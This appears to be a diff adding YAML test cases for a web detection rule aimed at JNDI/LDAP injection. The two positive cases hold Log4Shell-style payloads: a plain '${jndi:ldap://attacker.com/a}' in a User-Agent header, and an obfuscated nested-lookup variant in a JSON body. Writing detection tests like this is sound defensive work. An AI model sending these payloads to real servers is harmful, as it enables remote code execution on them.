@@ -1,0 +1,44 @@
+rule_id: sentinel-det-2026-0042
+test_cases:
+  - name: Positive Test - Standard JNDI LDAP Payload in User-Agent
+    expected_match: true
+    input:
+      request:
+        method: GET
+        path: /login
+        headers:
+          User-Agent: "${jndi:ldap://attacker.com/a}"
+        body: ""
+      response:
+        status_code: 200
+        headers:
+          Content-Type: text/html
+        body: "<html>Login Page</html>"
+
+  - name: Positive Test - Nested Expression in Body
+    expected_match: true
+    input:
+      request:
+        method: POST
+        path: /api/v1/auth
+        headers:
+          Content-Type: application/json
+        body: '{"username": "${${lower:j}${lower:n}${lower:d}${lower:i}:ldap://10.0.0.1/obj}"}'
+      response:
+        status_code: 500
+        headers: {}
+        body: "Internal error processing JNDI reference ldap://10.0.0.1/obj"
+
+  - name: Negative Test - Legitimate JSON Request
+    expected_match: false
+    input:
+      request:
+        method: POST
+        path: /api/v1/auth
+        headers:
+          Content-Type: application/json
+        body: '{"username": "admin@example.com", "token": "abc-12345"}'
+      response:
+        status_code: 200
+        headers: {}
+        body: '{"status": "authenticated"}'
